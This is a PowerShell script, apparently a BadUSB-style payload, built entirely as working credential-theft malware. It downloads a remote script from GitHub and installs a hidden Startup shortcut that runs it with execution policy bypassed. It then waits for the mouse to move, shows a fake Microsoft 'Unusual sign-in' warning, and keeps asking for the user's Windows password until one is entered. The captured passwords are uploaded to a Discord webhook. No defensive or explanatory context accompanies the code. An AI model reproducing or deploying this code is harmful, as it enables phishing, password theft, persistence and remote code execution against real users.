Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/fuera.ps1" -OutFile "$env:TMP\Fuera.ps1"

$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Fuera.lnk")
$shortcut.TargetPath = "powershell"
$shortcut.Arguments = "-NoProfile -w h -ExecutionPolicy Bypass -File `"$env:TMP\Fuera.ps1`""
$shortcut.Save()

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm).txt"

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}

Pause-Script

Caps-Off

Add-Type -AssemblyName System.Windows.Forms

[System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")

function Send {
if($creds -is [system.array]) { $creds = $creds[$creds.Length - 1] };
if($creds -eq "stop") {exit 0;}
$creds = "Password: " + $creds;
echo $creds >> $env:TMP\$FileName
$webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
$SourceFilePath="$env:TMP\$FileName"
curl.exe -F "file1=@$SourceFilePath" ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE");
}

function Get-Creds {
do{
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName);
   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
    [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
    $creds = $null
    #Get-Creds
} else { $creds = $cred.getnetworkcredential().password; Send }
} until ($done)
return $creds
}

$creds = Get-Creds
